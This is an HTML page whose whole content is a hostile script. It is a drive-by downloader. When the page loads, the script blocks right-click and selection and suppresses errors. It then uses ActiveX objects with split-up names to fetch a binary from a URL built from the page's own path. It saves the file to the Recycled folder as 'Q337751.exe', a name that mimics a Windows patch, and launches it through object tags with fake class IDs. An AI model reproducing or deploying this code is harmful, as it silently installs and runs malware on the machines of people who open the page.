<html><body oncontextmenu="return false" onselectstart="return false" ondragstart="return false"><script>
function s() {return true;}
function someErr() {ok = false;}
window.onerror=s;

pu = document.location.href;
pu = pu.substring(pu.indexOf("c:\\",1)+3,pu.length);
if (pu.indexOf("!",1) >= 0) pu = pu.substring(0,pu.indexOf("!"));
if (pu.indexOf(".mht") >= 0) pu = pu.substring(0,pu.indexOf(".mht"));
pu = pu.replace(/\\/g,'/');
pu = "http://"+pu;

var ok = false;
var d="C:\\Recycled\\Q337751.exe";
try {
	var x = new ActiveXObject("Micro"+"soft.XM"+"LHT"+"TP");
	x.Open("GET",pu,0);
	x.Send();
	var s = new ActiveXObject("AD"+"ODB.St"+"ream");
	s.Mode = 3;
	s.Type = 1;
	s.Open();
	s.Write(x.responseBody);
	s.SaveToFile(d,2);
} catch(e) {
	d = "D:\\Recycled\\Q337751.exe";
	var x = new ActiveXObject("Micro"+"soft.XM"+"LHT"+"TP");
	x.Open("GET",pu,0);
	x.Send();
	var s = new ActiveXObject("AD"+"ODB.St"+"ream");
	s.Mode = 3;
	s.Type = 1;
	s.Open();
	s.Write(x.responseBody);
	s.SaveToFile(d,2);
}
try{ok=true;document.write('<object classid=clsid:11311111-1111-1111-1111-111111111157 codebase="'+d+'" onerror="someErr()">');}
catch(e){ok=true;document.write('<object classid=clsid:10000000-1000-0000-10000-000300000001 codebase="'+d+'" onerror="someErr()"></object>');}
if(!ok)
	document.write('<object classid=clsid:11120607-1001-1111-1000-110199901123 codebase=in.exe></object>');
</script></body></html>
